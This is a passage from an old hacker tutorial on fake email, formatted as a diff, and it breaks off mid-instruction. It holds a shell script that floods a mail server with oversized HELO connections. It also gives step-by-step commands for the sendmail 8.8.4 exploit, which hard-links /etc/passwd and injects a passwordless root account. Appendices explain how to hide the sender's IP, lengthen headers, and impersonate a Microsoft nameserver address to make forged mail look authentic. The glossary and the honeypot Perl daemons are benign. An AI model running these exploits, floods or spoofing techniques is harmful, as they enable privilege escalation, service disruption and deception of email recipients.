+  sleep 1
+  exit 0
+fi
+
+if [ ! -f $1 ]; then
+  echo "Message file not found."
+  echo
+  exit 0
+fi
+
+echo -n "Preparing message..."
+mkdir $TMPDIR &>/dev/null
+chmod 700 $TMPDIR
+echo "echo \"helo _safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__sa
+febomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__saf
+ebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safe
+bomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safeb
+omb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebo
+mb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebom
+b__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb
+b__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb
+__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb_
+_safebomb__safebomb__safebomb__safebomb__safebomb__safebomb__safebomb_\"" >$PLIK
+echo "echo \"mail from: \\\"$4\\\"\"" >>$PLIK
+echo "echo \"rcpt to: $2\"" >>$PLIK
+echo "echo \"data\"" >>$PLIK
+echo "cat <<__qniec__" >>$PLIK
+cat $1 >>$PLIK
+echo "__qniec__" >>$PLIK
+echo "echo \".\"" >>$PLIK
+echo "echo \"quit\"" >>$PLIK
+echo "sleep $TIMEOUT" >>$PLIK
+chmod +x $PLIK
+echo "OK"
+
+echo "Sending $1 (as $4) to $2 via $3 -- Ctrl+Z to abort."
+SENT=0
+
+while [ -f $1 ]; do
+  $PLIK|telnet $3 25 &>/dev/null &
+  let SENT=SENT+1
+  echo -ne "Sent: $SENT\b\b\b\b\b\b\b\b\b\b\b\b\b"
+  CONNECTED=`ps|grep -c "telnet $3"`
+  if [ "$LIMIT" -le "$CONNECTED" ]; then
+    while [ "$LIMIT" -le "$CONNECTED" ]; do
+      sleep 1
+    done
+  fi
+  if [ "$SENT" -ge "$MAX" ]; then
+    echo "It's just an example, sorry."
+    echo
+    exit 0
+  fi
+done
+-- EOF --
+
+Suggested fix: insert additional length limit into HELO/EHLO
+parameter scanning routine OR disable AllowBogusHELO (but it
+may cause serious troubles). I have no 8.8.8 sources at the
+time, so execuse me if it's unclear.
+
+PS:
+
+--
+From: Gregory Neil Shapiro <sendmail+gshapiro@sendmail.org>
+
+I was able to reproduce the header problem by lengthening the HELO string
+in your script.
+
+[...]
+
+This will be fixed in sendmail 8.9.
+--
+
+_______________________________________________________________________
+Micha³ Zalewski [tel 9690] | finger 4 PGP [lcamtuf@boss.staszic.waw.pl]
+Iterowaæ jest rzecz± ludzk±, wykonywaæ rekursywnie - bosk± [P. Deustch]
+=--------- [ echo "while [ -f \$0 ]; do \$0 &;done" >_;. _ ] ---------=
+
+Giant Bug in Sendmail 8.8.4 (taken from hackersclub.com)
+***************************
+
+                         sendmail8.8.4 exploit 
+                           
+"sendmail? 'tis the bugiest program" -phriend-
+
+Ok, here's a brief and interesting explonation of this famous exploit. This
+exploit uses sendmail version 8.8.4 and it requires that you have a shell
+acount on the server in question. The exploit creates a link from
+/etc/passwd to /var/tmp/dead.letter Very simple really. Here's how it
+works, below are the exact commands as you have to type them (for the
+technically challendged ones)
+
+   * ln /etc/passwd /var/tmp/dead.letter
+   * telnet target.host 25
+   * mail from: nonexsistent@not.an.actual.host.com
+   * rcpt to: nonexsistent@not.as.actual.host.com
+   * data
+   * lord::0:0:leet shit:/root:/bin/bash
+   * .
+   * quit
+
+Kaboom, you're done, telnet to port 23 and log in as lord, no password
+required. Thanx to a little bit of work we did, lord just happens to have
+the same priviledges as root.
+
+There are a couple of reasons why this might not work.
+
+  1. /var and / are different partitions (as you already know, you can't
+     make hard links between different partitions)
+  2. There is a postmaster account on a machine or mail alias, in which
+     case, your mail will end up there instead of being written to a
+     etc/passwd
+  3. /var/tmp doesn't exist or isn't publicly writable
+
+Duncan Silver 
+www.hackersclub.com/uu
+
+Editor's notes: lord::0:0:leet shit:/root:/bin/bash is a line out of a Unix password file(33).
+
+Final Notes
+---------------
+You must have noticed that I didn't put anything from BugTraq. This is because everything that goes to BugTraq gets at least one reply (from my experience), and I don't feel like posting whole threads(34) here (they're too damn long).
+
+Newbies corner
+==============
+1. Daemon - a program that listens for incoming connections on a specific port(2). Some daemons may receive commands from you and interact with you, others may simply spew out some text/binary and quit.
+
+2. Port - (for the more technical explanation of what ports are, see the end of this explanation) ports are like holes that enable things (data, in this case) to come into them.
+There are physical ports and software ports on your computer. Physical ports are those slots on the back of your computer, your monitor etc'. Now, software ports are used when connecting to other computers.
+For example: I just bought a new computer and I want to turn it into a webserver (I want to enable people to access selecetd web pages, pictures, cgi and java scripts or applets, programs etc' that are located on my computer (MY computer, not on some cheesy free webhost such as Geocities), and I want those people to be able to do that using nothing but a browser). In order for that to happen, I need to install a webserver program.
+The webserver program opens a port on my computer called port 80 (this number can be changed, but this is the default number). Then it listens to incoming connections on that port.
+When someone starts his Internet browser (Netscape, Lynx, Microsoft Explorer etc') and surfs to my website, his browser connects to my computer on port 80 and then sends HTTP commands that my webserver program can understand into it.
+My webserver program quickly picks up the incoming data and then sends it back into a port that the surfer's browser opened on the surfer's computer. The browser will listen on that port and wait for the data (the HTML page, the picture, the program etc') to come in through it.
+Note about non-default ports: if you decide to put, say, a webserver on a non-default port, it'll be harder for people to get in. If you decided to put it on port... umm... 8000 instead of 80, people will have to type in your IP address(9) or your hostname(10) if you have one and add a :8000 at the end. For example:142.30.5.79:8080. Simply typing in 142.30.5.79 inside your browser's URL field is as same as typing 142.30.5.79:80, so it's best to put a webserver on port 80 (unless you only want a specific group of people who will be given that number to access your webserver, but such a blockage can be easily cracked using a portscanner(12)).
+There are different ports for different services(3) so data won't mix up. Imagine your browser getting data your FTP client was supposed to get.
+I hope you got the main idea of what a port is.
+Now, there are three kinds of ports: well-known ports, registered ports and dynamic/private ports.
+The well known ports are those from 0 through 1023. These are default ports for several services. For example: the default port for webservers is 80. Else, how would your browser know which port he has to access?
+Now, the registered ports are those from 1024 through 49151. These ports are reserved for several programs. For example: ICQ (www.icq.com) reserves several ports for listening to various incoming events (messages, file transfers etc') on it.
+The dynamic and/or private ports are those from 49152 through 65535, and can be used by anyone for any given purpose.
+
+Important note about well-known ports: services(3) on these ports can be only ran by root, so inferior users won't start messing up with important ports.
+
+3. Service - a daemon(1) that allows everyone who connects to it (or a specific group of people. For example: anyone from this IP(9) range, everyone who knows the secret password etc') to use some kind of service.
+For example: a webserver such as the one described in section one on this chapter (the explanation regarding what is a port) is a service because it allows people to come in and ask for certain pieces of data.
+The simplest example of a service I can think of is "daytime". Daytime waits for incoming connections on port(2) 13 and when someone goes by it immedietly announces the current time on the computer that runs it (with no need from you to type in any commands or passwords or anything). Simple.
+
+4. Daemon banner - most daemons(1) give away some technical info to anyone who connects to them on some point. This information can be used by anyone who connects to that daemon simply for it to know how to interact with the daemon best (which daemon is it, what version, etc'), but it can also be used by hackers.
+Let's try connecting to port(2) 23 on someone.com (note: I've made up this hostname(10) and all the details regarding it simply to teach you about daemon banners. I really don't know whether there is such a hostname and whether the details I'm about to give you are correct). On port 23 you would usually find Telnet(19). Telnet is a service which at first asks you for a username and a password on most cases (unless you typed in an "unpassworded" username. In that case it will simply log you in as that user without requesting for a password) and then runs a program specified by the sysadmin(22) and let's you work with it. In most cases you will get into a  text-based shell (a command interpreter(20)). The problem is: you cannot do ANYTHING. It all depends on what kinds of permissions the user that you are logged in as has. The user root(14) has all permissions (read everything, write (and delete) everything, execute everything and change other people's permissions).
+Okay, so let's try going to port 23 on someone.com. At first we get this:
+
+Welcome to someone.com, running FreeBSD 4.13
+Login:
+
+Aha! Someone.com is running an operating system called FreeBSD 4.13! That has to be worth something (we might come across a bug report regarding a bug that exists on FreeBSD 4.13 and might enable us to hack this server at a certain point). Every piece of information about a webserver is important.
+Now, since we don't know a username and a password for this server we could either terminate the connection or try guessing. Most servers have a guest account (username: guest, password: guest or just username: guest) or a newuser account (username: newuser, password: newuser, or just username: newuser), but that certainly won't help us hack these guys... unless there's a major hole in these accounts. You'll have to figure these things out by yourself.
+
+Note about the word server: a computer is called a server if it offers any services. If not, it is called a host.
+
+5. Timeout - okay, so I've got a daemon(1) waiting on port(2) 23 for incoming connections. Now, what happens if someone connects to it and does absolutely nothing? He would simply remain connected to that daemon until one of us either reboots or closes the connection. You don't want anyone connecting to some port on your computer and just hanging there, do you? This would only waste valuable bandwidth(15)!
+Most people will not want to monitor their network status 24 hours a day and disconnect everyone who decides to hang around for a while (especially on large networks). This is why timeout was invented.
+By setting a timeout value to a daemon (this can be done during the setup process or by running a setup program or entering some sort of an options box) you can make it close the connection on anyone who connets to it and does nothing for over than the timeout value.
+For example: you put a daemon on port 17 and tell it to timeout after 2.5 seconds. If someone will connect to your daemon and will not type anything for over than 2.5 seconds the daemon will close down the connection and that person will have to reconnect and start typing something before the daemon times out and throws him out.
+This is why webservers have a short timeout of 2 seconds (most people connect to webservers using client programs(16), and these programs "type" really fast...).
+
+6. TCP - stands for Transfer Control Protocol. TCP is a protocol that is used for transferring data through networks (the Internet, local networks etc'). TCP is much more reliable than UDP since it uses several precautions, such as sequence numbers and all sorts of nifty header flags and all (see the excellent article called 'IP Spoofing Demystified' at the Books Section in http://blacksun.box.sk for lots of info regarding TCP (a real MUST READ!!)).
+TCP's only disadvantage is that it is a bit slower than UDP, but it is more reliable, hence it is used to transfer sensitive files (such as programs - if you lose a single bit of the file, the whole thing is useless).
+
+7. UDP - stands for User Datagram Protocol. UDP is a protocol that is used for transferring data through networks (the Internet, local networks etc'). UDP is less reliable than TCP (see the excellent article called 'IP Spoofing Demystified' at the Books Section in http://blacksun.box.sk for lots of info regarding UDP (a real MUST READ!!)), but it is also a little faster, hence programs such as Real Player (see http://www.real.com) use it for streaming video and more, where losing a single packet(32) or two is not such a big deal.
+
+8. ICMP - stands for Internet Control Message Protocol. A protocol used for transferring errors over a network (the Internet, local networks etc').
+
+9. IP address - every computer connected to the Internet has an IP address. If another computer wants to interact with your computer it will need your IP, just like you need another person's phone number to call him.
+IP addresses should look like that: x.x.x.x, where x can be a number between 0 to 255.
+Note: there are "special" IP addresses which aren't use to connect to other computers. For example: 127.0.0.1 means localhost, which means you (your computer). Connecting to a certain port(2) on the IP 127.0.0.1 will connect to that port on your computer.
+Oh, by the way, IP stands for Internet Protocol(18).
+
+10. Hostname - hey, guess what! I just found out this really cool site! But I can't remember it's IP address, and when I do, I hate typing in these long IP addresses(9). Sure, I can bookmark it, but what if I'll want to tell my friends about it? Or what if I'll be surfing from my friend's house or from a public place and I won't have my bookmarks?
+The answer to all of these questions is hostnames.
+Hostnames are aliases to IP addresses. A list of hostnames and their IP addresses is located at InterNIC, which is a database of all hostnames and their IP addresses.
+When you type in a hostname, your computer will look up that hostname and find the appropriate IP address and then connect to it.
+But instead of having to overload InterNIC (imagine that the entire world will connect to them. This would surely overload their servers and they will have to spend money on constant upgrades and backups. And think what will happen if something bad will happen to their databases...). The solution for this problem is called DNS servers(17).
+
+11. Finding out what your ISP's mail servers are - there are several ways to do this:
+1) Call your ISP and ask them what is the IP address(9) or the hostname(10) of your outgoing mail server (this is the IP/hostname you will need to perform all the tricks in this tutorial). If you want to know a different ISP's mail server, call their tech support phone number. But what if they're on the other side of the world and you don't feel like spending tons of cash simply for calling them and being put on hold? In this case, try method 3.
+2) Start up your mail client, go to your preferences page and find what it says in the 'outgoing mail' field or in the 'SMTP server' field (both are the same. SMTP stands for Simple Mail Transfer Protocl, which is a protocol(18) that is used to send Emails over the Internet).
+3) Guessing. If your target server is someone.com, their mail server should either be mailgw.someone.com:25 (mailgw.someone.com on port(2) 25. Note: mailgw stands for mail gateway) or someone.com:25. If not, send an Email to admin@someone.com or support@someone.com and ask them what their mail server is (they should be happy to answer you, unless you tell them that you're an evil hacker or something. In that case they'll call the cops on you).
+Note: not every server on the planet has an outgoing mail server.
+
+12. Portscanner - a program that scans a target for open ports(2) by trying to connect to it on various ports. The simplest portscanner will start at port 1 and climbs up, but you can tell more advanced portscanners to scan a specific range, give you some info on open ports it might find etc'.
+
+13. Services scanner - a services scanner is much more sophisticated than a portscanner(12) since it tries to connect on predefined ports which should have the service(3) you're looking for on them.
+
+14. Root - an account on Unix computers which has maximum priviledges (read any file, write (and delete) to any file, execute any file and change other users' permissions). Note: other accounts may have root access, and the root account may not always have root access, depending on the sysadmin(22) (but root is the default account for root access).
+
+15. Bandwidth - the total amount of speed a network connection device (a modem, a network card, a mail pigeon etc') can get to. For example: I just bought a new modem. It has a bandwidth of 100Ks per second, meaning it can transfer up to 100Ks per second.
+When you use your network device to do something it will drain some of the bandwidth in order to do this operation.
+
+16. Client program - a program that connects to a certain service(3). Most client programs would know how to communicate with that service with or without the information it will receive from the daemon banner(4).
+Example: an Internet browser (such as Netscape) is a client program because it connects to port(2) 80, where the webserver daemon(1) is waiting for connections, and interacts with it in order to retrieve the file you're looking for. A browser has to know how to communicate with the webserver daemon (also referred to as HTTPD, HTTP Daemon. HTTP stands for Hyper Text(23) Transfer Protocol) in order to fulfill your requests.
+
+17. DNS server - a server that stores hostnames(10) and their IP addresses(11). Instead of having InterNIC's servers handle the entire planet, every ISP has a DNS server.
+When you type in a hostname and tell your modem to connect to it, your computer will perform an action called 'DNS Lookup'. In other words, it will ask your ISP's DNS server what is the appropriate IP address for the hostname you've typed in. If your ISP's DNS server will not know the answer, it will ask a higher-level DNS server. If the higher-level DNS server will not know the answer, it will ask an even higher-level DNS server, etc' etc' etc'. The highest level is InterNIC itself.
+If the DNS server knew the IP in the first place it would give it to you. If it didn't (and it only found it out after querying other servers), it will first add it to his own databases and then give it to you.
+
+18. Protocol - a set of rules used for computers to interact with each other over a network of some sort (such as the Internet or a some kind of a local network) they need to know a common protocol and each computer has to assume that the other one knows this protocol and uses it.
+
+19. Telnet - a program that in it's most simplicity allows you to form a text-based connection between your computer and another computer over a network of some sort. You may choose the IP address(9) or hostname(10) and the port(2) you wish to contact, and Telnet will establish a TCP(6) connection between both machines.
+Note about the Telnet daemon(1): the Telnet daemon is completely different. It waits for incoming TCP(6) or UDP(7) connections on port 23 and then asks the user for a login (often called a username) and a password (unless the user typed in an unpassworded username. In that case, he will get in without entering a password. Unpassworded accounts are often VERY limited) and then proceed to execute a program (usually a command interpreter(20)) and giving you some permissions, all depending on the username and the password you have entered (unless you gave in the wrong details. In that case, you will be told that either the username or the password are wrong and be given another try. Most systems give you three tries and then quit).
+
+20. Command interpreter - a program that accepts commands from the user and turns them into real commands your computer understands.
+For example: if your command interpreter contains a command called, say, display, which accepts a single parameter which should be a filename, and you type in 'display somefile' (without the quotes, and replace somefile with a real filename) then it will translate this command into 'okay mr. computer, find the hard drive by doing this and this, go to the FAT (File Allocation Table) and find out in which sector/sectors this file is located, grab the file and send it to the terminal device (the specified output device, usually your monitor)'. Get the main idea?
+
+21. Shell account - an account on a remote computer (a username and a password and a bunch of personal configuration files and stuff). Having a shell account on a remote computer means having the ability to telnet(19) into that computer on port 23, type in your account's login (also referred to as a username) and password and getting a command interpreter(20) with some permissions (depending on the sysadmin(22)).
+
+22. Sysadmin / admin - the man/woman/furry creature who is in charge of a system.
+
+23. Hyper Text - if you've ever seen an HTML document you should know what hyper text is, but you might not be aware of it. HTML stands for Hyper Text Markup Language. Hyper text is considered as "enhanced text", since you can add pictures, colors, links etc' to it. Compare that to the regular and dull text format which this tutorial uses... :D
+
+24. RFC - stands for Request For Comment. These are draft papers by the IETF (Internet Engineering Task Force - those guys who set all those Internet standards and stuff). They contain suggestions for Internet standards.
+You can search for RFCs at http://www.linuxberg.com.
+
+25. InterNIC - the domain registration database and the highest DNS(17) server on the planet.
+
+26. Sub domain - first class domains look like this: something.com (or other extensions, such as org, net, cc, co.uk etc'). It costs 70$ to register one (see http://www.networksolutions.com). Second class domains look like this: someone.something.com and they cost 0$ to register, if you already have something.com registered to you, of course (although you can get those for free on websites such as www.anrki.com). Third class domains look like this: blah.someone.something.com and they don't cost any money either, etc' etc' etc'.
+Note about the price of a first-class domain: this price does not include web hosting (someone who will host your website or whatever you want to put up on his server).
+
+27. SSH - stands for Secure Shell. This daemon(2) waits for incoming TCP(6) or UDP(7) connections on port 22. Once you connect to it, you will be asked for a Login and a Password, just like the Telnet daemon(19) does, only SSH encrypts everything for increased security.
+
+28. Moderated mailing list / message board - I'll explain this by giving you an example. BugTraq (see http://www.securityfocus.com) is one of the best security-related mailing list. Although people can "send things to the list" (meaning send an Email message and have it sent to all the members of the mailing list), you can't just send everything. Aleph1, the moderator, goes through all incoming messages and posts only the good ones.
+The same goes with moderated message boards, etc'.
+
+29. DoS attack - DoS stands for Denial of Service (also referred to as a "nuke" or a "newk"). A DoS attack is some kind of an attack that causes the target computer to deny some/all kinds of services to the users of that computer (local and/or remote users).
+For example: Winnuke (also known as OOB), the simplest DoS in the world.
+(Taken from Spikeman's DoS site) This denial of service program affects Windows clients by sending an "Out of Band" exception message to port 139, which does not know how to handle it. This is a standard listening port on Windows operating systems. Users of Win 3.11, Win95, and
+Win NT are vulnerable to this attack. This program is basically a nuisance program, but it is being widely circulated over the internet now. It has become a bother in chatrooms and on IRC. By using your IP# and sending OOB data to port 139, malicious users can disconnect you from
+the net, often leaving you with low resources and the blue tinted screen. Some of you may have been victims already. If this happens to you on Win 95, you will see a Windows fatal error message similar to the following:
+Fatal exception 0E at 0028: in VxD MSTCP(01) + 000041AE.
+This was called from 0028: in VxD NDIS(01) + 00000D7C.
+Rebooting the comp should return it to normal state.
+
+Patches ("fixes") For WinNuke (OOB) 
+-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=
+Additional Information on WinNuke
+http://support.microsoft.com/support/kb/articles/Q168/7/47.asp 
+Windows 95 Patches
+http://support.microsoft.com/download/support/mslfiles/Vipup11.exe
+http://support.microsoft.com/download/support/mslfiles/Vipup20.exe (for Winsock 2.0*)
+http://www.theargon.com/defense/nuke/index.html
+Please read notes referring to 95 patches before installing. 
+Which version of Winsock do you have on your Windows 95 PC?
+http://premium.microsoft.com/support/kb/articles/Q177/7/19.asp
+http://www.theargon.com/defense/nuke/index.html
+Windows NT 4.0 Patch
+http://support.microsoft.com/support/kb/articles/Q143/4/78.asp
+http://www.theargon.com/defense/nuke/index.html
+Please read notes referring to Windows NT patches before installing. 
+
+More info on DoS attacks can be found at Spikeman's DoS site: http://www.genocide2600.com/~spikeman/main.html
+
+* I really don't know if this patch will work on newer versions of Winsock. Therefore I'd like to recommend that you will first downgrade to Winsock 1.1 (the one that comes with Windows 95) by going to Control Panel, Network and removing TCP/IP and Dial Up Adapter(30) and then re-adding them by clicking add, choose protocol and in the company frame choose Microsoft. Then look for an option called TCP/IP and double-click it. As for DUN (Dial Up Networking), do the same but choose adapter instead of protocol.
+After you finish downgrading re-upgrade to Winsock 2.0, apply the patch (Vipup20.exe) and then upgrade to newer versions of Winsock.
+
+30. DUN - stands for Dial Up Adapter. DUN is the program that comes with Windows and dials to your ISP in case you have a dial-up account(31).
+
+31. Dial-Up account - a dial-up account at an ISP means that your modem has to dial some phone number before you can get on the net. Unlike other ISP accounts (direct cables which keep you online for 24 hours a day), you get a dynamic IP address(9) (and not a static one like on direct cable connections) since you have to connect and disconnect instead of just staying online all the time. Every time you re-connect you are assigned with a different IP address.
+
+32. Packet - a piece of data that travels over a network (such as the Internet or local/wide area networks). A packet consists of two main parts: the header and the data itself. The header contains all sorts of nifty values such as the TTL (Time To Live) and more (you can read about those in the Modem Speedup section at http://blacksun.box.sk). The data part contains the actual data that the packet is carrying.
+On a regular dial-up account(31), the size of a packet should be 576 bytes (including the header), but on direct cable connections a packet would be much bigger (again, see Modem Speedup section at blacksun.box.sk).
+
+33. Unix password files - Every Unix system has a password file. They contain a list of users, their passwords and some important information about them. The password file is located at /etc/passwd. Each line represents a user.
+Each line consists of 7 fields, seperated by : marks (commas).
+A line in a password file should look like this:
+Username:encrypted password:UID:GID:short description:home directory:shell
+Username - the user's username.
+Encrypted password - the user's password (encrypted for higher security). An encrypted password is always 13 characters long.
+UID - User ID. Each user has an ID number. If your UID is 0 it means you have root access(14).
+GID - Group ID. You can set groups (for example: all the workers in the accounting division) and set special permissions to that entire group. Root has GID 0.
+Short description - short description in human language.
+Home directory - the directory where all of the user's personal configuration files are held.
+Shell - a program that is executed once the user logs in. In most cases (and in this case too) the shell is a command interpreter(20).
+In our case, the encrypted password field is empty, which means that the user gets to log in by simply giving a username. This can be changed after we log in by typing passwd to the command interpreter. You will then be asked for a password to be set for your account.
+Note: on some systems, you have to type passwd your-username instead of simply typing passwd.
+Note 2: root can do passwd your-username and change your-username's password, no matter who your-username is.
+Note 3: if you put any characters that are not of the following sets: '. / 0-9 a-z A-Z' (without the quotes) or if you don't put anything in, the account is disabled so that user cannot log in.
+This is used when you know you might want to enable this account in the future.
+
+Cracking the encrypted password
+<><><><><><><><><><><><><><><><
+For this you need a password cracker. A password cracker is a program that takes a certain word out of a dictionary file (also referred to as a "wordlist") or a combination of letters, numbers etc' the program makes up systematically ("brute-force cracking"), encrypts it the way Unix encrypts passwords and then compares it to the passwords in a given password file. If the passwords match, it will announce the correct password for that username.
+
+
+34. Thread - right now I'm talking about threads in discussion lists and message boards, not on computer programs. We'll discuss about these in a later time (maybe).
+A thread is a series of posts which started out from a single one. Let me demonstrate: a person starts a thread by stating a fact or making an opinion. Then, another person comes into the discussion list or into the message board and states his opinion on the subject. Then another person joins in and reply to the replier's opinion. Then another one comes, but chooses to reply to the original message instead since he has nothing to say regarding the other messages (if he does, he can post two messages). You get the picture...
+
+
+Appendix A: Fake Daemons(1)
+===========================
+I found these two fake daemons (Sendmail and Telnet(19)) at packetstorm.securify.com once. They're great to fool attackers and to play tricks on your friends.
+These are Perl (a programming language) programs.
+To execute them (no, executing a file doesn't have anything to do with killing it...) on Unix, simply type ./filename and replace filename with the name of the file you wish to execute. Every Unix "flavor", "distribution" or whatever you want to call it, comes with Perl (I think. Correct me if I'm wrong: barakirs@netvision.net.il).
+To execute them under DOS/Windows, you have to download Active Perl from www.activeperl.com and then simply double click them.
+I don't know how to execute them under Mac. I guess Active Perl supports Macs, but I'm not sure.
+
+Now, on to the fake daemons.
+These two daemons came in a single package together with a readme file. Following are all three files. I did not alter any of those files, it's up to you to do so. Play with them and learn.
+Oh, by the way, if you wish to learn Perl (or any other programming language), head off to http://blacksun.box.sk and find the books section.
+Enjoy!
+
+== Readme ==
+
+heh.. this piece is no way serious, but if anyone think it would be cool to
+ keep working on the piece, drop a line with your ideas. We may develop it
+ further. ;-). I basically coded it just for fun, when I had few spare
+ minutes.
+
+
+ The piece is supposed to be `want-to-be-Windog-Deception-toolkit' which
+ contains sample sendmail.pl and telnetd.pl which are supposed to be fake
+ sendmail and telnet daemons. To run this code you will need to download
+  and install perl for windoze. (I used active perl from
+  http://www.activeware.com to test it).
+
+
+ Hope you will have fun with it
+
+ C.P.
+fygrave@tigerteam.net
+Sun May 23 17:12:51 KGST 1999
+
+== End of Readme ==
+
+-- [ SendmailD ] -- #editor's notes: SendmailD stands for Sendmail Daemon(1), just like TelnetD stands for Telnet Daemon etc'
+
+#!/usr/bin/perl
+
+use Socket;
+
+$port=25;
+$hostname="booga.com"; # does windog have gethostbyname?
+$banner="220 boogaa.com ESMTP Sendmail 8.6.1/8.5.0\n\r"; # date should be aslo here
+$fail="500 Command unrecognized:";
+
+
+
+socket(S,AF_INET,SOCK_STREAM,$protocol) || die "socket: $!";
+
+$sockaddr='S n a4 x8';
+
+$this=pack($sockaddr,AF_INET,$port,"\0\0\0\0");
+
+bind(S,$this) || die "bind: $!";
+
+listen(S,10) || die "listen: $!";
+
+select(S);
+$|=1;
+select(STDOUT);
+
+while(1) {
+($addr= accept(NS,S)) || die "accept: $!";
+
+	select(NS);
+	$|=1;
+	select(STDOUT);
+
+#
+#here we should fork. but damn windog doesn't support this. crap.
+# Any ideas?
+		($af,$port,$inetaddr)=unpack($sockaddr,$addr);
+		@inetaddr=unpack('C4',$inetaddr);
+		($i1,$i2,$i3,$i4)=@inetaddr;
+		$ipaddr="$i1.$i2.$i3.$i4";
+		print "connected from $ipaddr\n";
+		
+		print NS $banner;
+		while(<NS>) {
+		if (/EHLO/i) {
+			print NS "Hello $ipaddr. nice to meet you\n\r";
+		} else {
+		 print NS "$fail $_\r";
+		 print "tried $_";
+		 }
+		}
+		print "$ipaddr disconnected\n";
+		
+		close(NS);
+	}
+
+-- [ End of SendmailD ] --
+
+-- [ Telnetd ] --
+
+#!/usr/bin/perl
+
+use Socket;
+
+$port=23;
+$login="\n\rlogin:";
+$password="password:";
+$banner="\n\r\n\rUnix(r) System V Release 4.0 (brooder)\n\r";
+$fail="login incorrect.\n\r";
+
+
+socket(S,AF_INET,SOCK_STREAM,$protocol) || die "socket: $!";
+
+$sockaddr='S n a4 x8';
+
+$this=pack($sockaddr,AF_INET,$port,"\0\0\0\0");
+
+bind(S,$this) || die "bind: $!";
+
+listen(S,10) || die "listen: $!";
+
+select(S);
+$|=1;
+select(STDOUT);
+
+while(1) {
+($addr= accept(NS,S)) || die "accept: $!";
+
+	select(NS);
+	$|=1;
+	select(STDOUT);
+
+#
+#here we should fork. but damn windog doesn't support this. crap.
+# Any ideas?
+		($af,$port,$inetaddr)=unpack($sockaddr,$addr);
+		@inetaddr=unpack('C4',$inetaddr);
+		($i1,$i2,$i3,$i4)=@inetaddr;
+		$ipaddr="$i1.$i2.$i3.$i4";
+		print "connected from $ipaddr\n";
+		
+		print NS $banner;
+		print NS $login;
+		while(<NS>) {
+			print "attempt to log in as $_\n";
+			print NS "$password";
+			
+			$ll=<NS> || last;
+			sleep 5;
+			print "tried password $ll. Login incorrect is given\n";
+			print NS $fail;
+			print NS $login;
+		}
+		print "$ipaddr disconnected\n";
+		
+		close(NS);
+	}
+
+-- [ End of TelnetD ] --
+
+
+Appendix B: Routing Mail
+========================
+You can make your mail go through many different servers in order to make the header longer and confuse people who would try to track it down.
+Example: if you want to send the fake mail to blah@blah.com, and route it through blaha.com, blahb.com and blahc.com, then in the 'rcpt to:' part, simply do this: @blaha.com,@blahb.com,@blahc.com:blah@blah.com
+Note: this will not work on every Sendmail daemon.
+
+Thanks to Magnus Kristiansen for this one! ;-)
+
+
+Appendix C: Faking your IP
+==========================
+So you don't want people to find your IP and your hostname when they look at the full header? Then simply fake your IP!
+You can do this by using Wingates or SOCKS firewalls, or telnetting to the Sendmail daemon from a shell account. If you use either one of those, the full header will show the Wingate's/SOCKS firewall's/shell provider's IP address.
+If you find a shell account that allows you to telnet out of it, you can use it to fake your IP. Otherwise, use Wingates or SOCKS firewalls. To learn more about then, read our Proxy/Wingate/SOCKS tutorial and our anonymity tutorial at blacksun.box.sk.
+Also, we recommend going to the books section on our website and downloading the excellent item called "IP Spoofing Demystified". The stuff written in there may not be so practical, but it is very important reading (you will learn a lot of important stuff that you could use later).
+
+
+Appendix D: Reply-to
+====================
+The Reply-to option does the following: when a person receives an Email with a reply-to address and sends a reply, the reply is sent to the address specified within the Reply-to command (this does not work on really really old Email clients).
+To use it, simply insert this line:
+Reply-to: some-user@some-server.net
+and replace some-user and some-server.net with the appropriate user and server. You have to include this line before or after the "Subject:" part.
+
+
+Appendix E: CC and BCC
+======================
+CC is used to send a message to other people that are not the recipients of the message, but might need the information in it.
+BCC is used the same way, only people can only see the recipient.
+The B in BCC stands for Blind, while the CC stands for Carbon Copy (like when you copy a page using... nevermind). So BCC stands for Blind Carbon Copy while CC stands for Carbon Copy. Exciting, isn't it? Thanks to i2tb for this information.
+Want to use CCs and BCCs within your fake Emails? No problem!
+They work exactly the same as the Reply-to command in Appendix D. Simply put CC: or BCC: lines in your fake mail (inside the body of the message), and then insert the appropriate Email addresses.
+
+
+Appendix F: Using Named to Create Ever More Authentic-Looking Fake Mails
+========================================================================
+Here's a text file I found somewhere.
+
+       
+              Written by Damx  http://www.unitedcouncil.org  
+            
+
+
+NOTE: This will only work if you have a network
+card that is not being used for your internet connection
+         
+This is a little info on sending fake e-mail from your Linux box.
+
+____________________________________________________________________________
+
+Here is what you do. First find a host you want to be. 
+My favorite is microsoft.com. I will put these steps in order
+
+at the prompt type this-->#whois microsoft.com 
+you will see something like this 
+
+
+Technical Contact, Zone Contact:      
+MSN NOC  (MN5-ORG)  msnnoc@MICROSOFT.COM      206 882 8080   
+
+Billing Contact:      
+MSN Domain Billing  (MDB-ORG)  msnbill@MICROSOFT.COM      206 882 8080   
+
+Record last updated on 08-Jul-97.   
+Record created on 02-May-91.   
+Database last updated on 15-Feb-98 06:46:54 EDT.   
+
+Domain servers in listed order:   
+
+
+ATBD.MICROSOFT.COM           131.107.1.7   
+DNS1.MICROSOFT.COM           131.107.1.240   
+DNS3.NWNET.NET               192.220.250.7   
+DNS4.NWNET.NET               192.220.251
+
+
+
+
+now what you do is pick a name server you want to be 
+at the prompt type this-->#ifconfig eth0 137.107.1.7  then hit enter
+
+now type at the prompt--->#route add 137.107.1.7 eth0  then hit enter.
+
+Now everything is set up. Here is how you go about sending fake e-mail.
+
+NEWBIE NOTE: This can be traced so do not use it to harrass others.
+
+Now that is out of the way SENDING THE FAKE E_MAIL :::
+
+at the prompt  #telnet mailgw.something.net  <ENTER>
